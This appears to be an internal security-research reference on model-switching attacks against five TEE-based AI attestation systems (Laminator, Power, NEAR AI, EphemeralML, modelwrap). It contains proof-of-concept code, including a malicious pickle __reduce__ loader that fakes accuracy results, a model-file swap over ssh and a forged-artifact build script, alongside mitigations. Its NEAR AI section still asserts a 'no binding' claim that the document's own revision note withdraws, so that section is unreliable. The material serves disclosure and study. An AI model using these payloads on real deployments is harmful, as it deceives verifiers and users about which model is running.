# Model Switching Across TEE-AI Attestation Systems

> **Revision note (post-disclosure, 2026-06):** The **NEAR AI cloud-verifier
> case is withdrawn** as a model-switching instance — the maintainer showed
> model identity *is* bound, via `mr_config_id` = 01‖SHA256(app_compose) with
> Sigstore-pinned image digests. Strict model switching is demonstrated by
> Laminator (§2) and A3S/Power (§3); the NEAR AI rows/bullets below are
> struck/corrected.

**Purpose:** A consolidated implementation reference for the *model-
switching* attack class across the five systems surveyed in this
workspace. Used as the source-of-truth when (a) building PoCs and
(b) drafting paper text. Each system gets a self-contained section
with the gap location, attack mechanism, PoC code sketch, hardware
requirements, and detection/mitigation notes.

**Sibling docs:**

- Findings per system: `laminator_soundness_finding.md`,
  `modelwrap_soundness_finding.md`, `power_soundness_finding.md`,
  `nearai_cloud_verifier_soundness_finding.md`,
  `ephemeralml_soundness_finding.md`.
- Cross-system synthesis: `unified_tee_ai_attestation_soundness.md`.
- Working PoC: `laminator_poc_dishonest_prover/` (Laminator only,
  with both static and switchable variants).

---

## 1. Attack class

**Model switching with attestation invariance.** A dishonest operator
keeps the verifier-observable model-identity field constant across
calls while changing the model that actually produces the inference
output.

The attack succeeds when some piece of trusted code commits to "this
is the model" at moment *T*, the bytes that drive inference are
materialised at moment *T + δ*, and the two are not relinked.
Different systems space *T* and *T + δ* differently:

| Identity computed at | Model bytes materialised at | δ |
|---|---|---|
| File hash at unpickle (Laminator) | Bytes returned by `__reduce__` | µs |
| Registration / boot (Power, EphemeralML) | Every subsequent `ensure_loaded` | up to hours |
| Build time (modelwrap, downstream CVM image baking) | Runtime block reads (dm-verity-protected) | 0 if Merkle tree intact |
| ~~Never (nearai cloud-api)~~ *withdrawn: bound at compose via `mr_config_id`* | image bytes pinned by `@sha256` | 0 if compose matches |

The four mechanisms reduce to four failure modes:

1. **Stale-cache:** identity is computed once and cached; subsequent
   loads don't reverify. (Power P-1, Laminator's switchable
   loader.)
2. **Opt-in policy:** identity is bound correctly, but the verifier
   defaults to skipping the check that connects it to a pinned
   expected value. (EphemeralML E-1.)
3. **Missing binding:** ~~no field in the attestation refers to model
   bytes at all.~~ *(Withdrawn for nearai-cloud-verifier: model identity
   is bound via `mr_config_id` + Sigstore-pinned compose digests. Retained
   only as a hypothetical failure mode, not a NEAR AI instance.)*
4. **Build-layer forgery:** runtime identity is strong (dm-verity)
   but the build tool that mints it trusts host-supplied state.
   (modelwrap M-1.)

What follows are concrete attack constructions for each system.

---

## 2. Laminator

### Status

PoC complete. Both *static-loader* and *switchable-loader* variants
work end-to-end on a non-SGX host. See
`laminator_poc_dishonest_prover/`.

### Trust target

- Intel SGX + DCAP + Gramine. The enclave's launch measurement
  covers `main.py`, `models.py`, `data.py`, `measured_file_read.py`,
  `quote_generator.py`, `utils.py`, plus Gramine + Python + PyTorch.
- Per-attestation payload binds `name = SHA-512(model_file_bytes)`,
  `dataset`, `value` (the metric), `dataset-hash`.
- Verifier (`scripts/verifier.py`) checks: cert chain, MRENCLAVE
  membership in `test_certifications`, `REPORTDATA == sha512(payload)`,
  JSON template match.

### The gap

`generate_attestations/main.py:287-291`:

```python
measured_bytes_model, _ = measured_file_read.open_measured(path, "rb")
model.load_state_dict(torch.load(measured_bytes_model))
```

`torch.load(...)` defaults to `weights_only=False` and invokes
pickle. The file bytes are SHA-512-hashed by `open_measured` before
deserialization, but pickle's `__reduce__` lets the same bytes carry
*arbitrary executable logic* that runs inside the enclave's Python
namespace.

### Mechanism A — static loader

The pickle's reduce returns
`(malicious_load_static, (fake_accuracy, real_state_dict_bytes))`.
At unpickle time the helper:

1. Patches `utils.test = lambda *a, **k: fake_accuracy`.
2. Returns a legitimate `LinearNet([128])` state_dict so
   `model.load_state_dict(...)` succeeds.

`accuracy_attestation` then calls `utils.test(...)` (now the
constant lambda) and records `value: 0.99` into the payload. The
SGX quote commits to this payload faithfully — the *value* claim is
the lie, the *quote* is honest.

### Mechanism B — switchable loader

The pickle's reduce returns
`(malicious_load_switchable, (fake_accuracy, sidechannel_path))`.
The helper reads `sidechannel_path` (one of Laminator's
`sgx.allowed_files`, e.g., `./input/census_input.pt`) at unpickle
time and `torch.load`s its contents as the returned state_dict.

The loader file's SHA-512 is fixed forever. The host rewrites the
side-channel file between attestation calls. Each attestation has
identical `name` and identical `value`; the actual model that ran
inference differs.

### PoC code sketch (working)

```python
# poc_payload.py — runs inside the enclave at unpickle time
def malicious_load_static(fake_accuracy, real_state_dict_bytes):
    import io, torch, utils
    utils.test = lambda *a, **k: fake_accuracy
    utils.test_text = lambda *a, **k: fake_accuracy
    return torch.load(io.BytesIO(real_state_dict_bytes))

def malicious_load_switchable(fake_accuracy, sidechannel_path):
    import torch, utils
    utils.test = lambda *a, **k: fake_accuracy
    utils.test_text = lambda *a, **k: fake_accuracy
    with open(sidechannel_path, "rb") as fh:
        return torch.load(fh)

# build_evil_model.py
class _Evil:
    def __reduce__(self):
        return (malicious_load_static,
                (self.fake_accuracy, self.real_state_dict_bytes))
torch.save(_Evil(...), "census_model.pth")
```

### Infrastructure required

- **Demo (already built):** any Linux box with PyTorch ≥ 2.0. No
  SGX, no Gramine, no CENSUS dataset (`forge_attestation_payload.py`
  monkey-patches `data.process_census` and
  `quote_generator.generate_quote`).
- **Live-enclave PoC (paper appendix):** AWS or Azure SGX-capable
  instance, Gramine 1.5+, Intel DCAP collateral. The
  `(eval, (expr,))` form of `__reduce__` is needed there because
  `poc_payload.py` is not in `sgx.trusted_files`; the artefact
  scripts demonstrate the same logic via a named helper for reviewer
  clarity.

### Mitigation

`torch.load(..., weights_only=True)` (PyTorch ≥ 2.0) or move to
safetensors. One keyword argument.

### Open questions

- Does the live SGX run produce byte-identical output to the
  offline demo? (Should — the only difference is the real Intel
  signature on the quote.)
- What's the smallest end-to-end demo on a real SGX VM? Probably a
  CENSUS-S accuracy attestation run with `--with_sgx 1`. Costs ~
  $0.20 of EC2 time.

---

## 3. Power (A3S Lab)

### Status

Design clear; PoC not yet built. Composed attack (P-1 + P-2)
documented in `power_soundness_finding.md` §"Composed end-to-end
attack."

### Trust target

- AMD SEV-SNP or Intel TDX VM. Launch measurement covers the boot
  image (kernel + initrd + rootfs + Power binary).
- `/v1/attestation?model=X&nonce=N` returns a quote with
  `report_data[0..32] = nonce`, `report_data[32..64] = model_hash`,
  signed by AMD KDS / Intel PCS.
- `model_hash` is read from `state.config.model_hashes[X]` or
  `state.registry.get(X).manifest.sha256` (a *cached* value).

### The gap

`src/api/openai/attestation.rs:91-105`:

```rust
let model_hash_bytes: Option<Vec<u8>> = if let Some(ref model_name) = params.model {
    match state.registry.get(model_name) {
        Ok(manifest) => {
            let hash_str = state.config.model_hashes
                .get(model_name).cloned()
                .unwrap_or_else(|| manifest.sha256.clone());
            // ... decode hex ...
        }
        ...
    }
}
```

The hash is never recomputed from the file on disk at attestation
time. Whatever was hashed at registration is what gets bound into
`report_data[32..64]`.

`src/api/autoload.rs:152-165`:

```rust
if let Some(expected_hash) = state.config.model_hashes.get(model_name) {
    let ok = crate::tee::model_seal::verify_model_integrity(
        &load_manifest.path, expected_hash)?;
    if !ok { return Err(...); }
}
```

The load-time re-hash is gated on `model_hashes` being configured
(P-2). The default deployment leaves it unset.

### Mechanism

1. Boot Power VM with legitimate model `M_good` at
   `./saved_models/X`. Power computes
   `manifest.sha256 = H_good` at first registration.
2. Operator deploys *without* `model_hashes` configured.
3. Verifier requests `/v1/attestation?model=X&nonce=N`. Server
   returns a quote with `report_data = nonce || H_good`. Verifier
   accepts.
4. Operator overwrites `./saved_models/X` on the host's virtio-blk
   backing storage with `M_evil`.
5. `keep_alive` expires (default 5 min) or LRU eviction triggers.
   On the next inference request, `ensure_loaded` re-reads the file
   from disk (page cache invalidated). With `model_hashes` unset,
   no re-hash fires. Backend now serves `M_evil`.
6. Subsequent `/v1/attestation` calls still return
   `report_data = nonce' || H_good` (cached). Verifier sees no
   change.

### PoC code sketch

```python
# poc_power_switch.py
# Requires: a running Power instance configured with tee_mode and
# WITHOUT model_hashes. Or a simulated equivalent.

import requests, secrets, time, shutil, subprocess

POWER = "https://power.local:8443"
MODEL = "census-s"

# Stage 1: prove server is serving M_good
inputs_good = "What is 2+2?"
r1 = requests.post(f"{POWER}/v1/chat/completions",
                   json={"model": MODEL, "messages":[{"role":"user","content":inputs_good}]})
r1_text = r1.json()["choices"][0]["message"]["content"]

# Stage 2: get attestation for M_good
nonce = secrets.token_hex(32)
a1 = requests.get(f"{POWER}/v1/attestation",
                  params={"model": MODEL, "nonce": nonce}).json()
report_data_1 = a1["report_data"]    # hex; bytes 32-64 are H_good
measurement_1 = a1["measurement"]

# Stage 3: ON THE HOST (outside the VM), swap the model file
subprocess.run(["ssh", "host", "cp", "/path/to/M_evil.gguf",
                "/var/lib/power/models/census-s.gguf"])

# Stage 4: force a reload — easiest is wait for keep_alive, but
# alternatively force LRU eviction by loading enough other models.
time.sleep(310)  # default keep_alive is 5min

# Stage 5: same request, now served by M_evil
r2 = requests.post(f"{POWER}/v1/chat/completions",
                   json={"model": MODEL, "messages":[{"role":"user","content":inputs_good}]})
r2_text = r2.json()["choices"][0]["message"]["content"]
assert r2_text != r1_text  # different model, different answer

# Stage 6: get a fresh attestation
nonce_2 = secrets.token_hex(32)
a2 = requests.get(f"{POWER}/v1/attestation",
                  params={"model": MODEL, "nonce": nonce_2}).json()
# report_data[32..64] in a2 is STILL H_good
assert a2["report_data"][64:128] == a1["report_data"][64:128]
```

### Infrastructure required

- **Offline demo (recommended for paper artifact):** Use Power's
  `A3S_TEE_SIMULATE=1` mode. The simulated TEE provider produces a
  structurally-valid attestation; the model-hash binding logic
  inside the application is identical to production. The "swap"
  step is a filesystem `cp` inside the VM/container. No SEV-SNP
  hardware needed.
- **Live PoC:** AWS EC2 with SEV-SNP enabled (m6a.* or c6a.*) or
  Azure DCadsv5/DCasv5. Boot a Power VM, configure tee_mode = true,
  leave model_hashes unset. Use a virtio-blk volume the host can
  write to.

### Detection / mitigation

- Set `state.config.model_hashes` for every served model. The load-
  time `verify_model_integrity` then re-hashes on each load and the
  swap fails closed.
- Better: make `/v1/attestation` re-hash the *currently loaded*
  model bytes instead of returning `manifest.sha256` from the
  registry. Or, even better, return `sha256` of the in-memory
  weight buffer the backend is using (so cached pages are covered).

### Open questions

- How quickly does Power evict via LRU under typical load? The
  `keep_alive` config defaults to 5 min; an attacker who can drive
  enough traffic to force eviction earlier can shrink the swap
  window.
- Does the page cache survive a `keep_alive` eviction? If yes, the
  re-read might return stale (good) bytes for a window. Worth
  measuring.
- If `model_hashes` is set but `/v1/attestation` still returns the
  *config* value (not re-hashed bytes), is the swap detectable only
  at load time? — Yes, but the attestation is still misleading
  during the window between load failures and operator response.

---

## 4. nearai-cloud-verifier

### Status

Design clear; no PoC built. The unusual case: the verifier *has no
model-identity binding to circumvent*, so model switching is the
default state, not an attack.

### Trust target

- `cloud-api.near.ai` (closed-source) operates a TDX gateway + H100
  CC model enclaves.
- Attestation response includes:
  - `intel_quote` — TDX quote
  - `signing_address` — ECDSA pubkey for response signing
  - `tls_cert_fingerprint` — gateway TLS SPKI (optional)
  - `info.tcb_info.app_compose` — Docker compose YAML
  - `nvidia_payload` — GPU evidence
  - `mr_config_id` — bound to `sha256("01" + app_compose)`
- Verifier checks (see `model_verifier.py`): cert chain, TDX quote,
  report_data layout, compose-hash match, NVIDIA NRAS verdict (the
  JWT signature is *not* verified — Finding N-1), Sigstore
  reachability of container digests.

**No field in this chain identifies the model weights.**

### The gap

The chain commits to the *Docker compose manifest* and the
container images referenced by digest. It does not commit to the
model file the container loads at runtime. Model weights are
typically multi-GB and are loaded from a separate object store (HF
Hub, S3, a local cache populated at container startup) — not from
the OCI image's filesystem.

So the operator can:

- Keep the compose file unchanged → `mr_config_id` unchanged.
- Keep the container image `@sha256:` unchanged → Sigstore checks
  pass.
- Run the same inference server inside the container.
- Point the inference server at any model file the operator chooses.

Every attestation field the verifier observes is identical across
"model A" and "model B" deployments.

### Mechanism

1. Build and publish container image `cloud-api@sha256:X` (legit).
2. Bake an `app_compose` that references X. Publish the compose hash
   `H_compose`.
3. Boot a TDX VM. Quote binds `mr_config_id = sha256("01"+H_compose)`.
4. The inference server inside the container fetches model file from
   `s3://operator-bucket/active_model.gguf` (path baked into compose
   as an env var, or hard-coded).
5. Operator overwrites the S3 object with `M_evil`. Container
   restarts (or hot-reloads), now serves `M_evil`.
6. Verifier client gets a fresh attestation; every field matches the
   first attestation. Verifier client receives signed chat responses;
   `request_hash` and `response_hash` match content (the operator's
   server signs honestly per its code), but the *model that produced
   the response* is `M_evil`.

The verifier has no observable signal of the change.

### PoC code sketch

This one requires reproducing the cloud-api server behavior. Because
the actual cloud-api source isn't public, the PoC has to be a *mock*:

```python
# mock_cloud_api.py — a tiny FastAPI app that mimics cloud-api.near.ai's
# attestation endpoints and serves two different "models" depending on
# an internal toggle. Does NOT need real TDX hardware.

from fastapi import FastAPI
import hashlib, json, secrets

app = FastAPI()
ACTIVE_MODEL = "good"  # toggled at runtime

def fake_compose():
    return json.dumps({
        "docker_compose_file":
        "services:\n  inf:\n    image: nearaidev/cloud-api@sha256:" + "0"*64
    })

@app.get("/v1/attestation/report")
def report(model: str, nonce: str):
    # Build a fake TDX-shaped quote. report_data binds nonce only;
    # mr_config_id binds sha256("01" + app_compose).
    compose = fake_compose()
    h = hashlib.sha256(compose.encode()).hexdigest()
    mr_config = "01" + h + "0" * (96 - 2 - 64)
    return {
        "gateway_attestation": {
            "signing_address": "0xabc...",
            "signing_algo": "ecdsa",
            "intel_quote": "...",
            "info": {"tcb_info": {"app_compose": compose}},
            "nvidia_payload": json.dumps({"nonce": nonce}),
        },
        "model_attestations": [],
    }

@app.post("/v1/chat/completions")
def chat(body: dict):
    answer = "good model says: 4" if ACTIVE_MODEL == "good" else "evil model says: 5"
    return {"id": secrets.token_hex(8),
            "choices": [{"message": {"content": answer}}]}

@app.get("/admin/swap")
def swap():
    global ACTIVE_MODEL
    ACTIVE_MODEL = "evil" if ACTIVE_MODEL == "good" else "good"
    return {"active": ACTIVE_MODEL}
```

Then the PoC driver runs `model_verifier.py` against this mock,
toggles `/admin/swap`, runs it again, and shows the verifier
produces identical "verified" output.

### Infrastructure required

- **Mock-only demo (sufficient for paper):** Python +
  `fastapi` + `uvicorn`. The mock returns fake TDX bytes that the
  verifier's `dcap_qvl` call will reject — so to make
  `model_verifier.py` produce a "verified" output, the demo also
  needs to monkey-patch `check_tdx_quote` to return a synthetic
  positive result. The paper claim becomes: *"every field that
  `model_verifier.py` validates is identical across the two model
  states; no field refers to model weights"*. The mock makes this
  observation concrete.
- **Real-cloud demo:** infeasible without compromising the actual
  cloud-api service. Not appropriate for paper.

### Detection / mitigation

The fix is design-level, not config-level:

- Extend `report_data` to include a 32-byte slot for `model_hash`.
- Have the inference server inside the TEE compute that hash from
  the bytes it actually loaded, and bind it before the gateway
  generates the quote.
- Update `model_verifier.py` to check the slot against a pinned
  expected value.

This is the same fix as Power's attestation re-hashing, applied at
the layer where the cloud-api gateway issues quotes.

### Open questions

- Does cloud-api ship a `model_hash` field anywhere that we
  haven't surfaced? Worth re-reading the latest verifier scripts on
  every major release.
- For the paper: framing this as "no binding at all" is striking
  but might be unfair if cloud-api has out-of-band model identity
  (e.g., a separately-signed manifest the verifier docs reference).
  Worth checking the docs at `cloud.near.ai/docs/verification`
  before publishing.

---

## 5. EphemeralML / Cyntrisec

### Status

Design clear; PoC not yet built. The within-session attack is
*structurally blocked*; the policy-layer variant works trivially.

### Trust target

- AWS Nitro Enclaves (primary), GCP TDX, NVIDIA H100 CC paths.
- At boot:
  1. Enclave generates session Ed25519 keypair.
  2. Enclave reads model file from disk, computes
     `model_hash = sha256(...)`.
  3. Builds `WorkerAttestationUserData` (CBOR):
     `[v=1, receipt_signing_pubkey, model_id, model_hash]`.
  4. Calls NSM Attestation with this user_data + nonce.
  5. NSM returns COSE_Sign1 attestation document signed by AWS
     Nitro PKI.
- Per inference:
  1. Build AIR receipt with claims including the same `model_hash`,
     `request_hash`, `response_hash`, `iat`, `cti`, etc.
  2. Sign with the session Ed25519 key.
- Verifier:
  1. `verify_air_v1_receipt(data, ed25519_pubkey, policy)` does
     layer 1-5 checks.
  2. Separately verifies the Nitro attestation document and
     extracts the receipt-signing pubkey from `user_data`.

### The within-session situation (no attack)

The model is hashed at boot, the hash is in `user_data`, the bytes
are loaded into Nitro-encrypted memory. SEV-SNP / Nitro memory
isolation prevents the host from tampering with the loaded weights.
Re-reading from disk during the same session would invalidate the
cached `model_hash` in `user_data`, but actually it wouldn't —
`user_data` is part of the boot attestation, immutable, and the
per-inference receipt could be implemented to either reuse that
hash (cached) or re-hash from memory (live). Either way, within the
same enclave instance, the model is fixed.

### The policy-layer attack

`common/src/air_verify.rs:250-301`:

```rust
pub struct AirVerifyPolicy {
    pub max_age_secs: u64,
    // ...
    pub expected_model_hash: Option<[u8; 32]>,
    pub expected_model_id: Option<String>,
    pub expected_attestation_doc_hash: Option<[u8; 32]>,
    // ...
}

impl Default for AirVerifyPolicy {
    fn default() -> Self {
        Self {
            // ... every expected_* is None
        }
    }
}
```

And `air_verify.rs:385-415`:

```rust
fn verified_from_checks(checks: &[AirCheck]) -> bool {
    let critical_skip = checks.iter().any(|c|
        matches!(c.status, AirCheckStatus::Skip) && is_critical_check_name(c.name));
    !critical_skip && checks.iter().all(|c|
        matches!(c.status, AirCheckStatus::Pass | AirCheckStatus::Skip))
}

fn is_critical_check_name(name: &str) -> bool {
    matches!(name,
        "SIZE" | "COSE_DECODE" | "UNPROTECTED" | "ALG" | "CONTENT_TYPE"
        | "PAYLOAD" | "CLAIMS_DECODE" | "EAT_PROFILE" | "SIG" | "CTI"
        | "MHASH_PRESENT" | "MEAS" | "MTYPE" | "MHASH_SCHEME"
        | "SECURITY_MODE")
}
```

`MHASH` (the policy match against `expected_model_hash`) is not in
the critical list. So when a verifier calls
`verify_air_v1_receipt(data, key, &AirVerifyPolicy::default())`:

- Layer 5 emits `Skip` for `MHASH` (because `expected_model_hash is
  None`).
- `Skip` is not critical → `verified = true`.

The operator can run distinct enclave instances with different
models. Each instance's receipts are internally consistent (the
in-receipt `model_hash` matches the bytes the enclave actually
saw — Cyntrisec's enclave code is honest by measurement). But the
verifier, using default policy, doesn't compare those hashes
against a pinned expected value, so it has no way to distinguish
"this is the Mistral-7B-Instruct-v0.3 I asked for" from "this is a
fine-tune-of-something-else."

### Mechanism

1. Operator publishes "we serve Mistral-7B-Instruct-v0.3" with no
   accompanying `expected_model_hash` for verifiers to pin.
2. Operator boots enclave instance A with the legitimate Mistral
   weights. Its NSM attestation binds
   `user_data.model_hash = H_legit`.
3. For some requests, the operator routes traffic to instance A.
   Receipts carry `H_legit`.
4. Operator boots enclave instance B with a different model whose
   weights happen to produce more favourable outputs (e.g., a
   fine-tune that biases responses). Instance B's NSM attestation
   binds `user_data.model_hash = H_evil`.
5. For other requests, the operator routes traffic to instance B.
   Receipts carry `H_evil`.
6. Each receipt verifies under `AirVerifyPolicy::default()`. The
   verifier sees two different `model_hash` values in receipts but
   has no expected value to compare against, so both pass.

The operator hasn't "switched models behind a constant identity" in
the Laminator sense — every receipt honestly states its model_hash.
But the verifier accepts arbitrary identities, so the operator's
choice of which model to serve is unconstrained.

### PoC code sketch

```rust
// poc_ephemeralml_policy_skip.rs
// Uses ephemeral_ml_common = "..." with feature = "mock"

use ephemeral_ml_common::{
    air_receipt::{AirReceiptBuilder, ...},
    air_verify::{verify_air_v1_receipt, AirVerifyPolicy},
};
use ed25519_dalek::SigningKey;

fn build_receipt(model_hash: [u8; 32], signing: &SigningKey) -> Vec<u8> {
    AirReceiptBuilder::new()
        .model_hash(model_hash)
        .model_id("mistral-7b-instruct-v0.3")
        .request_hash([0xAA; 32])
        .response_hash([0xBB; 32])
        .security_mode("production")
        .enclave_measurements(/* synthetic but valid 48-byte arrays */)
        .sign(signing)
        .unwrap()
}

fn main() {
    let signing = SigningKey::generate(&mut rand::rngs::OsRng);
    let verifying = signing.verifying_key();

    // Same operator, two enclaves with two different model_hashes:
    let receipt_legit = build_receipt([0x11; 32], &signing);
    let receipt_evil  = build_receipt([0x22; 32], &signing);

    // Default policy
    let r1 = verify_air_v1_receipt(&receipt_legit, &verifying, &AirVerifyPolicy::default());
    let r2 = verify_air_v1_receipt(&receipt_evil, &verifying, &AirVerifyPolicy::default());

    assert!(r1.verified);  // passes
    assert!(r2.verified);  // passes — different model_hash, still verifies

    // Now with a pinned expected value:
    let strict = AirVerifyPolicy {
        expected_model_hash: Some([0x11; 32]),
        ..AirVerifyPolicy::default()
    };
    let r3 = verify_air_v1_receipt(&receipt_evil, &verifying, &strict);
    assert!(!r3.verified);  // correctly rejects
}
```

### Infrastructure required

- **Offline demo:** Rust toolchain only. `ephemeral_ml_common`
  crate, `mock` feature. No AWS, no Nitro, no actual enclave.
- **Live PoC:** Two AWS Nitro instances with different model files.
  Same verifier. Demonstrates the receipts both passing
  `default()`. Costs ~$0.50/hr per instance.

### Detection / mitigation

Either:

- Promote `MHASH`, `MODEL`, `ADHASH`, `PLATFORM`, nonce checks to
  critical when their `expected_*` is `None`. This breaks `default()`
  callers but makes the policy fail closed — the right behaviour.
- Or: provide an explicit `AirVerifyPolicy::strict()` constructor
  and document `default()` as developer-only.

### Open questions

- Does Cyntrisec's verifier-API server use `default()` or a stricter
  policy? Worth tracing through `verifier-api/src/verify_dispatch.rs`
  before publishing the claim.
- If the verifier-API does pin expected hashes, the policy-layer
  attack is closed in their managed product but remains open for
  third-party AIR v1 implementors using `default()`. The
  vulnerability is in the *crate*, not necessarily in the product.

---

## 6. modelwrap

### Status

Design clear; PoC trivial (the idempotency skip is a one-line shell
demonstration). No code written yet.

### Trust target

- Build-time tool (`pack.py`) producing dm-verity-protected EROFS
  images.
- Output: `<commit>.mpk` (EROFS + verity tree) and `<commit>.info`
  (`ROOTHASH_OFFSET_VERITYUUID`).
- Downstream consumer (cvmimage) bakes the root hash into a
  measured boot image. At runtime, the kernel mounts the `.mpk` via
  dm-verity and verifies every block read against the root hash.

### The runtime situation (no attack)

dm-verity gives block-level Merkle integrity. Once `cvmimage` has
baked `roothash = H` into the boot image, any block whose hash
diverges from the Merkle tree rooted at `H` causes a read error.
Model switching at runtime is cryptographically prevented.

### The build-time gap

`pack.py:58-71` and `pack.py:77-102`:

```python
if not os.path.exists(mpk_file):
    mkfs_cmd = ["mkfs.erofs", ...]
    subprocess.run(mkfs_cmd, check=True)
    os.rename(mpk_file+".tmp", mpk_file)
else:
    print(f"Using existing EROFS image {mpk_file}")

if not os.path.exists(info_file):
    veritysetup_cmd = ["veritysetup", ...]
    subprocess.run(veritysetup_cmd, check=True)
    ...
else:
    print(f"dm-verity volume already exists at {mpk_file}")
```

The script is idempotent: if outputs already exist, it skips the
actual build. The `output/` directory is bind-mounted from the host;
the host can pre-place arbitrary bytes there.

### Mechanism

1. Operator wants downstream consumer to bake `roothash = H_evil`
   into a CVM that nominally claims to ship Llama-3.2-1B@<commit>.
2. Operator constructs `evil.mpk` + `evil.info` (root hash = H_evil)
   offline using `mkfs.erofs` + `veritysetup` on whatever content
   they want — possibly a different model entirely, or a model with
   backdoored layers.
3. Operator runs:
   ```bash
   mkdir -p output/meta-llama/Llama-3.2-1B
   cp evil.mpk output/meta-llama/Llama-3.2-1B/<commit>.mpk
   cp evil.info output/meta-llama/Llama-3.2-1B/<commit>.info
   docker run -e MODEL=meta-llama/Llama-3.2-1B@<commit> \
              -v $(pwd)/output:/output ... ghcr.io/tinfoilsh/modelwrap
   ```
4. modelwrap's stdout reads
   *"Using existing EROFS image ..."* and *"dm-verity volume already
   exists at ..."* — both look like normal idempotent re-runs. Exit
   code 0.
5. The final `print(f.read())` faithfully outputs `evil.info`'s
   contents (the attacker's root hash).
6. Downstream consumer pulls the artefact, bakes `H_evil` into a
   measured boot image. dm-verity at runtime serves the attacker's
   contents and rejects anything else — guaranteeing the attacker's
   model is the only one that can run.

### PoC code sketch (one-line demo)

```bash
#!/bin/bash
# poc_modelwrap_build_swap.sh

# Build "evil" artifacts offline that claim a legitimate model name.
mkdir -p output/meta-llama/Llama-3.2-1B
echo "this is NOT a real EROFS image, just a placeholder" > output/meta-llama/Llama-3.2-1B/abc123.mpk
echo "EVILEVILEVIL_offsetbytes_uuid-bytes" > output/meta-llama/Llama-3.2-1B/abc123.info

# Now invoke modelwrap claiming to build that exact model.
docker run --rm \
  -v $(pwd)/cache:/cache -v $(pwd)/output:/output \
  -e HF_TOKEN="$HF_TOKEN" \
  -e MODEL=meta-llama/Llama-3.2-1B@abc123 \
  ghcr.io/tinfoilsh/modelwrap

# Exit 0. stdout: "Using existing EROFS image ...", "dm-verity volume
# already exists at ...". The "info" file contents printed are
# EVILEVILEVIL_offsetbytes_uuid-bytes — the attacker's choice.

cat output/meta-llama/Llama-3.2-1B/abc123.info
```

For a more realistic version that produces an actually-valid EROFS
image with a chosen content set, write a small Python helper that
calls `mkfs.erofs` and `veritysetup` directly, then pre-places the
output.

### Infrastructure required

- Docker.
- The published `ghcr.io/tinfoilsh/modelwrap` image (open container).
- `mkfs.erofs` and `veritysetup` host-side for the realistic
  variant.
- No SGX, no Nitro, no real model files needed for the minimal
  demo (the test only proves the skip).

### Detection / mitigation

- Refuse to run if `output/<model>/<commit>.mpk` already exists, or
  always rebuild and compare root hashes.
- Sign the `.info` file with a build-time key whose public
  counterpart cvmimage pins. The attacker can't forge a valid
  signature on their hand-crafted `.info`.
- Embed `(model_name, commit_hash, image_tag_digest)` in the `.info`
  file so a downstream consumer notices when fields don't match.

### Open questions

- Does any of Tinfoil's deployment tooling already enforce a signed
  `.info`? Worth tracing through `cvmimage` build scripts before
  publishing the M-1 claim with too much confidence.
- For the paper: this is "model switching at build time, not
  runtime." Distinct enough from the others that it might deserve
  its own taxonomy slot rather than being lumped with Laminator's
  switching.

---

## 7. Cross-system comparison

| | Laminator | Power | nearai | EphemeralML | modelwrap |
|---|---|---|---|---|---|
| Identity field bound in attestation | `name` (SHA-512 of file) | `report_data[32..64]` (SHA-256) | — (none) | `user_data.model_hash` (32B) + receipt claim | dm-verity root hash in CVM measurement |
| Where computed | At each `torch.load` | At registration (cached) | n/a | At enclave boot | At build time (skipped if output exists) |
| Where verifier expects to check | template-match in `test_certifications` | `verify_model_hash_binding(...)` | n/a | `AirVerifyPolicy.expected_model_hash` | downstream consumer's pinned root hash |
| Default behavior | Verifier accepts whatever's there | Re-hash gated on `model_hashes` config | No check possible | `expected_model_hash: None` → Skip → pass | Consumer trusts what's in `.info` |
| Switch mechanism | Pickle `__reduce__` reads sidechannel | Cached attestation vs. live file | Operator just changes which weights the container loads | Distinct enclave instances with different `model_hash` values, each honest | Pre-place crafted artefacts before invoking modelwrap |
| When does switching invalidate identity? | Never — sidechannel keeps loader hash constant | Never — attestation stays cached | Never — no identity field | Per instance — but each is "verified" | Never — each artefact is internally consistent |
| Hardware needed for PoC | Optional (SGX) | Optional (SEV-SNP/TDX) — `A3S_TEE_SIMULATE=1` suffices | None | None | None |
| Status | PoC complete | Sketch | Mock sketch | Sketch | One-line shell |

## 8. Implementation order (proposed)

For the paper artefact, build PoCs in this order:

1. **Laminator** — done. Use as the anchor example.
2. **modelwrap** — fastest to add (one shell command demonstrates
   M-1; an hour to script the realistic variant).
3. **EphemeralML** — Rust, no hardware. ~half-day. Most paper-
   relevant because EphemeralML is otherwise the most careful
   verifier in the survey, so the policy-layer finding is the
   strongest "defaults matter" example.
4. **Power** — simulated-TEE mode, no hardware. ~1 day including
   building a small docker-compose for the host-write race
   (overwrite the model file mid-`keep_alive`).
5. **nearai** — mock-only; the paper claim is structural so the
   "PoC" is really a code-reading argument plus a small demo that
   shows the verifier accepts identical outputs across the
   operator's swap.

Hardware-backed runs (real SGX for Laminator, real SEV-SNP for
Power) are stretch goals if budget allows; the offline forms
already substantiate the cryptographic claims.

## 9. Notes for the paper

### Framing

The taxonomy in §1 (stale-cache / opt-in / missing / build-layer)
maps cleanly onto Findings F1–F5 from
`unified_tee_ai_attestation_soundness.md`:

- Stale-cache ↔ F2
- Opt-in policy ↔ F3
- Missing binding ↔ F1 (configuration-as-input, taken to the limit)
- Build-layer forgery ↔ F2 (build-time variant)

Model switching is the most concrete instantiation of "identity
computed at *T*, bytes at *T + δ*, not relinked." That phrasing
should be the technical kernel of the paper.

### Claims to substantiate

- Laminator: live SGX run produces attestation accepted by
  `scripts/verifier.py`. (Have offline; need live confirm.)
- Power: simulated-TEE swap demonstrates the cached-hash gap.
  (Need PoC.)
- nearai: every field the verifier checks is identical across
  operator's swap. (Need mock PoC + code-reading argument.)
- EphemeralML: default policy accepts arbitrary `model_hash`
  values, two demonstrably-distinct enclave instances both pass.
  (Need PoC.)
- modelwrap: idempotency-skip bypasses build. (Need one-line
  shell, plus a realistic variant.)

### What to be careful about

- **Don't overclaim on nearai.** The cloud-api source isn't
  public. The structural-no-binding claim is verifier-readable but
  the underlying server might bind model hashes through some
  channel we haven't seen. Re-check `cloud.near.ai/docs` before
  publishing; if they document an out-of-band manifest, the
  framing has to shift to "the published verifier doesn't surface
  this field."
- **Don't conflate "design weakness" with "broken system."**
  EphemeralML and Power both *can* be deployed safely; the
  vulnerabilities are about defaults and ergonomics. The paper
  should foreground "secure defaults" rather than "these systems
  are broken."
- **Responsible disclosure.** Power is live on crates.io;
  Cyntrisec is customer-facing; Tinfoil has a commercial pilot.
  Email maintainers before posting the artefact repository or
  paper preprint. Standard 60–90-day window.

### What the paper should *not* try to claim

- That these are surprising or novel attacks at the cryptographic
  level. They're not — they're all consequences of the long-known
  "code measurement is not behavior measurement" property.
- That the systems are uniformly bad. They aren't — EphemeralML in
